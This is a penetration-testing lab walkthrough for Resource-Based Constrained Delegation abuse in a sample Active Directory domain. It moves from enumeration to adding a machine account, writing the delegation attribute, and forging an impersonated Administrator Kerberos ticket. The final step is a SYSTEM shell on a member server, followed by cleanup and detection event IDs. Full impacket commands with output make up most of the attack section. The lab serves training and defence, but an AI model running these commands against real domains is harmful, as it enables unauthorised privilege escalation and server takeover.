# Lab 05: Resource-Based Constrained Delegation (RBCD) Exploitation

> **Lab Focus**: Complete operational execution of Resource-Based Constrained Delegation (RBCD) abuse, leveraging write permissions on a computer object, `ms-DS-MachineAccountQuota`, and Service for User (S4U) ticket forging to achieve SYSTEM access on a target member server.

---

## 1. Lab Topology & Initial State

```
+-----------------------------------------------------------------------------------------+
| LAB TOPOLOGY                                                                            |
|                                                                                         |
|  [ATTACK BOX]               [DOMAIN CONTROLLER]           [TARGET MEMBER SERVER]        |
|  Kali Linux                 Windows Server 2022           Windows Server 2022           |
|  IP: 10.0.0.150             DC01.corp.local               SQL01.corp.local              |
|  Account: jdoe              IP: 10.0.0.1                  IP: 10.0.0.25                 |
|                             Roles: AD DS, KDC             Target Object: SQL01$         |
+-----------------------------------------------------------------------------------------+
```

* **Attacker Account**: `CORP\jdoe` (Password: `Summer2024!`)
* **Vulnerability Condition**: In Active Directory, user `jdoe` has `GenericWrite` permissions over computer object `SQL01$`, but is **not** a local administrator on `SQL01`.
* **Domain Configuration**: `ms-DS-MachineAccountQuota = 10` (Default setting).

---

## 2. Phase 1: Enumeration & Permission Verification

### Step 1: Verify `ms-DS-MachineAccountQuota`
Check whether the domain permits standard users to create computer accounts:

```bash
python3 -c '
import ldap3
server = ldap3.Server("10.0.0.1", get_info=ldap3.ALL)
conn = ldap3.Connection(server, user="corp\\jdoe", password="Summer2024!", auto_bind=True)
conn.search("dc=corp,dc=local", "(objectClass=domainDNS)", attributes=["ms-DS-MachineAccountQuota"])
print("Machine Account Quota:", conn.entries[0]["ms-DS-MachineAccountQuota"])
'
```

```text
Machine Account Quota: 10
```

### Step 2: Verify Write Permissions on `SQL01$`
Using BloodHound or PowerView, confirm that `jdoe` holds `GenericWrite` or `WriteProperty` over `SQL01$`:

```powershell
Get-DomainObjectAcl -Identity "SQL01" -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser jdoe).objectsid }
```

```text
AceQualifier       : AccessAllowed
ActiveDirectoryRights : WriteProperty
ObjectAceType      : msDS-AllowedToActOnBehalfOfOtherIdentity
SecurityIdentifier : S-1-5-21-3914562810-2856192837-1928374619-1105 (CORP\jdoe)
```

---

## 3. Phase 2: Active RBCD Exploitation

### Step 1: Create a Controlled Computer Account
Because RBCD requires a security principal that holds a Service Principal Name (SPN), we use `impacket-addcomputer` to register a new computer account:

```bash
impacket-addcomputer 'corp.local/jdoe:Summer2024!' \
  -computer-name 'ATTACKCOMP$' \
  -computer-pass 'CompPass2024!' \
  -dc-ip 10.0.0.1
```

#### Terminal Execution:
```text
[*] Successfully added machine account ATTACKCOMP$ with password CompPass2024!.
```

---

### Step 2: Configure Delegation on the Target Server
Using `impacket-rbcd`, we write a new Security Descriptor to `SQL01$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, granting `ATTACKCOMP$` permission to act on its behalf:

```bash
impacket-rbcd -action write \
  -delegatee 'ATTACKCOMP$' \
  -target 'SQL01$' \
  -dc-ip 10.0.0.1 \
  'corp.local/jdoe:Summer2024!'
```

#### Terminal Execution:
```text
[*] Connecting to LDAP server: 10.0.0.1:389 - SSL: False
[*] Target computer: SQL01$
[*] Delegatee computer: ATTACKCOMP$
[*] Updating msDS-AllowedToActOnBehalfOfOtherIdentity...
[+] Successfully written msDS-AllowedToActOnBehalfOfOtherIdentity attribute on SQL01$!
```

---

### Step 3: Execute S4U2self & S4U2proxy to Request Impersonated Ticket
We now use `impacket-getST` to perform the Kerberos Service for User exchange:
1. `ATTACKCOMP$` requests a ticket to ITSELF on behalf of `Administrator` (S4U2self).
2. `ATTACKCOMP$` presents that ticket to the KDC to request a ticket for `cifs/sql01.corp.local` as `Administrator` (S4U2proxy).

```bash
impacket-getST -spn cifs/sql01.corp.local \
  -impersonate Administrator \
  -dc-ip 10.0.0.1 \
  'corp.local/ATTACKCOMP$:CompPass2024!'
```

#### Terminal Execution:
```text
[*] Connecting to KDC: 10.0.0.1:88
[*] Getting TGT for user: ATTACKCOMP$
[*] Impersonating user: Administrator
[*] Requesting S4U2self ticket...
[*] Requesting S4U2proxy ticket for SPN: cifs/sql01.corp.local
[*] Saving ticket in Administrator@cifs_sql01.corp.local@CORP.LOCAL.ccache
[+] Successfully obtained service ticket for Administrator!
```

---

### Step 4: Gain SYSTEM Access on Target Server
Export the obtained ticket into your environment variable and execute remote commands via `wmiexec`:

```bash
export KRB5CCNAME=Administrator@cifs_sql01.corp.local@CORP.LOCAL.ccache

impacket-wmiexec -k -no-pass 'corp.local/Administrator@sql01.corp.local'
```

#### Terminal Execution:
```text
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell through WMI...
[*] Installed command executor on target!

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
SQL01
```

---

## 4. Phase 3: Post-Exploitation Cleanup

In an authorized penetration test, operators must remove the artifacts created during RBCD:

### Step 1: Clear the RBCD Security Descriptor
```bash
impacket-rbcd -action flush \
  -target 'SQL01$' \
  -dc-ip 10.0.0.1 \
  'corp.local/jdoe:Summer2024!'
```

### Step 2: Delete the Created Machine Account
```bash
impacket-addcomputer 'corp.local/jdoe:Summer2024!' \
  -computer-name 'ATTACKCOMP$' \
  -delete \
  -dc-ip 10.0.0.1
```

---

## 5. Phase 4: Defensive Telemetry & Detection

### 1. Event ID 5136 on Domain Controller:
Monitors directory attribute modifications:
* **Object DN**: `CN=SQL01,OU=Servers,DC=corp,DC=local`
* **Attribute LDAP Display Name**: `msDS-AllowedToActOnBehalfOfOtherIdentity`
* **Operation Type**: `Value Added`
* **Subject User Name**: `jdoe`

### 2. Event ID 4769 on KDC:
* **Service Name**: `SQL01$`
* **Ticket Options**: `0x40810000`
* **Transited Services**: Contains `ATTACKCOMP$` (Identifies that delegation/proxy transition occurred).
